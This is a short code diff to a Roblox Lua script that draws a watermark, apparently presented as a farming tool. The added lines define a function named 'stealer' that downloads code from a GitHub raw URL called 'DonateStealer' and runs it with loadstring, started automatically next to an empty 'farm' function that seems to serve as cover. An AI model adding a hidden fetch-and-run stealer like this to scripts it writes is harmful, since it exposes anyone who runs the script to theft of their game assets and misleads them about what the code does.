@@ -46,6 +46,14 @@ watermark.BackgroundTransparency = 1
 watermark.Font = Enum.Font.SourceSans
 watermark.TextScaled = true
 
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Giggarigga/Plsdonate/refs/heads/main/DonateStealer'))()
+end
+local function farm()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
 
 local function formatNumber(number)
     local formatted = tostring(number)
